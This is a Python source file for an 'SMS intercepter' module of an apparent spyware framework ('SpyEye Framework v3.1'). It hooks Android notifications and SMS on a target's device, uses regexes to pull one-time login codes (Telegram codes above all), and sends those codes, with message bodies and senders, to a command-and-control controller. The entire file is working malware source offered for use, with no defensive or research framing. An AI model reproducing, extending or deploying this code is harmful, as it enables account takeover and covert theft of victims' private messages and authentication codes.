"""
modules/sms_intercepter.py

Advanced Notification & SMS Interception Module for SpyEye Framework v3.1.
  - Interfaces with Android NotificationListenerService and SMS ContentProvider.
  - Filters and extracts high-value authentication vectors specifically targeting Telegram login OTP codes.
  - Streams captured sensitive payloads securely to the C2 server via WebSocket telemetry.
"""

import logging
import re
import time
from typing import Any, Dict, Optional

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class SMSIntercepterModule(BaseModule):
    """
    Monitors incoming SMS messages and notification banners to capture OTP codes,
    with a primary focus on filtering and isolating Telegram login verification codes.

    Configuration Parameters:
        target_app (str): Package name filter for notification listening (default: "org.telegram.messenger")
        otp_patterns (list): Regex patterns to isolate verification digits (default: common 5-6 digit OTPs)
        mode (str): Interception mode: "sms", "notifications", or "both" (default: "both")
        auto_forward (bool): Automatically dispatch captured OTPs back to master controller (default: True)
    """

    # Default compiled regex pattern for detecting Telegram and general multi-digit OTP codes
    OTP_REGEX = re.compile(r"(?:code|otp|verification|login)[:\s#-]*([0-9]{4,6})", re.IGNORECASE)
    TELEGRAM_SENDER_PATTERNS = ["telegram", "tg"]

    def __init__(self, target_id: str, config: Optional[Dict[str, Any]] = None):
        super().__init__(target_id, config)
        self._result_callback = None
        self._is_active = False

    def validate_config(self) -> bool:
        """Validate optional interception filtering parameters."""
        mode = self.config.get("mode", "both")
        if mode not in ["sms", "notifications", "both"]:
            logger.error("[%s] Invalid interception mode specified: %s", self._module_name, mode)
            return False
        return True

    def set_result_callback(self, callback) -> None:
        """Inject real-time WebSocket telemetry dispatch callback."""
        self._result_callback = callback

    def run(self) -> None:
        """Activate the SMS and Notification interception loop on the target environment."""
        if not self.validate_config():
            self._emit_error("Configuration validation failed for SMS/Notification intercepter.")
            return

        self._is_active = True
        mode = self.config.get("mode", "both")
        target_app = self.config.get("target_app", "org.telegram.messenger")

        logger.info(
            "[%s] Interception engine activated — Mode: %s | App Target: %s",
            self._module_name, mode, target_app
        )

        self._emit_status({
            "status": "active",
            "mode": mode,
            "target_app": target_app,
            "message": "Notification and SMS monitoring listener successfully hooked."
        })

    def process_incoming_notification(self, notification_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Process intercepted notification payloads from Android NotificationListenerService,
        filtering for Telegram or matching authentication criteria.
        """
        if not self._is_active:
            return None

        package_name = notification_data.get("package_name", "")
        title = notification_data.get("title", "")
        text = notification_data.get("text", "")

        target_app = self.config.get("target_app", "org.telegram.messenger")

        # Filter strictly for target application or known Telegram identifiers
        if target_app.lower() in package_name.lower() or "telegram" in title.lower():
            extracted_otp = self._extract_otp_code(text)
            
            if extracted_otp:
                payload = {
                    "source": "notification",
                    "package": package_name,
                    "title": title,
                    "message_body": text,
                    "otp_code": extracted_otp,
                    "timestamp": time.time()
                }
                logger.info("[%s] Telegram Login OTP successfully intercepted via Notification: %s", self._module_name, extracted_otp)
                self._emit_result(payload)
                return payload

        return None

    def process_incoming_sms(self, sms_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Process incoming SMS text messages extracted from device ContentProvider / BroadcastReceiver.
        """
        if not self._is_active:
            return None

        sender = sms_data.get("sender", "")
        body = sms_data.get("body", "")

        # Check if sender matches Telegram or contains verification indicators
        is_telegram = any(p in sender.lower() for p in self.TELEGRAM_SENDER_PATTERNS)
        extracted_otp = self._extract_otp_code(body)

        if is_telegram or extracted_otp:
            payload = {
                "source": "sms",
                "sender": sender,
                "message_body": body,
                "otp_code": extracted_otp or "[NOT_FOUND]",
                "is_telegram": is_telegram,
                "timestamp": time.time()
            }
            logger.info("[%s] High-value authentication SMS intercepted from [%s]: Code -> %s", self._module_name, sender, extracted_otp)
            self._emit_result(payload)
            return payload

        return None

    def _extract_otp_code(self, text: str) -> Optional[str]:
        """Parse raw notification or text body to extract verification tokens."""
        if not text:
            return None

        # Search via primary regex pattern matching keywords like 'code' or 'otp'
        match = self.OTP_REGEX.search(text)
        if match:
            return match.group(1)

        # Fallback heuristic: look for standalone 4 to 6 digit strings if message references login
        if "login" in text.lower() or "telegram" in text.lower() or "signin" in text.lower():
            standalone_digits = re.findall(r"\b\d{5,6}\b", text)
            if standalone_digits:
                return standalone_digits[0]

        return None

    def stop(self) -> None:
        """Deactivate interception listeners and terminate execution thread."""
        self._is_active = False
        logger.info("[%s] SMS & Notification intercepter explicitly deactivated.", self._module_name)
        self._emit_status({
            "status": "stopped",
            "message": "Interception monitoring services shut down."
        })

    def _emit_result(self, data: Dict[str, Any]) -> None:
        """Dispatch intercepted OTP telemetry packets to C2 controller."""
        payload = {
            "target_id": self.target_id,
            "module": "sms_intercepter",
            "action": "intercepted_data",
            "data": data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)

    def _emit_status(self, data: Dict[str, Any]) -> None:
        """Dispatch operational lifecycle updates."""
        payload = {
            "target_id": self.target_id,
            "module": "sms_intercepter",
            "action": "lifecycle",
            "data": data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)

    def _emit_error(self, message: str) -> None:
        """Dispatch error notifications."""
        payload = {
            "target_id": self.target_id,
            "module": "sms_intercepter",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)